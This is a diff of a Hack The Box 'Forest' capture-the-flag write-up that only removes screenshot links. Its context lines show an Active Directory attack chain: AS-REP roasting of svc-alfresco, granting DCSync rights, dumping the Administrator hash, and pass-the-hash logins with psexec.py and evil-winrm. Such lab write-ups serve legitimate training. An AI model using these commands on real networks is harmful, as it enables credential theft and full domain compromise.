@@ -31,8 +31,6 @@ nmap -p53,88,135,139,389,445,464,593,636,5985,9389 -sCV <target>
 DNS, Kerberos, LDAP, SMB, WinRM, plus the Exchange-related `9389` (ADWS). Add
 `htb.local` and `forest.htb.local` to `/etc/hosts`.
 
-![Nmap scan of the Domain Controller](../images/forest-01-nmap.png)
-
 ### Enumerating users (anonymous)
 
 ```bash
@@ -42,8 +40,6 @@ crackmapexec smb <target> --users
 ```
 
 This yields the user list, including service accounts such as **svc-alfresco**.
-
-![rpcclient enumdomusers listing domain accounts](../images/forest-02-enumdomusers.png)
 
 ---
 
@@ -56,8 +52,6 @@ cracked offline:
 GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip <target>
 # $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
 ```
-
-![GetNPUsers retrieving the AS-REP hash for svc-alfresco](../images/forest-03-asreproast.png)
 
 Crack it:
 
@@ -106,8 +100,6 @@ Windows Permissions**, which has **WriteDACL** on the domain object. The attack 
      -PrincipalIdentity hacker -Rights DCSync
    ```
 
-![BloodHound path: svc-alfresco → Exchange Windows Permissions → WriteDACL → domain](../images/forest-04-bloodhound-path.png)
-
 3. DCSync the Administrator hash:
 
    ```bash
@@ -121,8 +113,6 @@ Windows Permissions**, which has **WriteDACL** on the domain object. The attack 
    psexec.py htb.local/Administrator@<target> -hashes :<admin-nt-hash>
    # or: evil-winrm -i <target> -u Administrator -H <admin-nt-hash>
    ```
-
-![secretsdump via DCSync and PtH as Administrator](../images/forest-05-dcsync-pth.png)
 
 ```
 C:\> whoami
